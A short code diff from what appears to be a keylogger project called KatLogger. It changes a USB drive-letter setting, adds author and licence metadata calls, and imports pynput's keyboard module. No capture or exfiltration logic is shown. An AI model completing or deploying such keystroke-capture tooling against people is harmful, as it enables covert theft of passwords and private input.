@@ -1,4 +1,11 @@
-USB_rappresentation_letter = "K://"
+USB_rappresentation_letter = "K:\\"
+
+import kat
+
+kat.authors("@Lif28, @rickyfili10")
+kat.licence("GPL-3.0 licence")
+kat.link("https://github.com/Lif28/KatLogger/tree/main?tab=GPL-3.0-1-ov-file")
+kat.web("nothing for now :/")
 
 # !!! warning: even if not all libraries are used, leave them anyway in the code !!!
 import pynput.keyboard
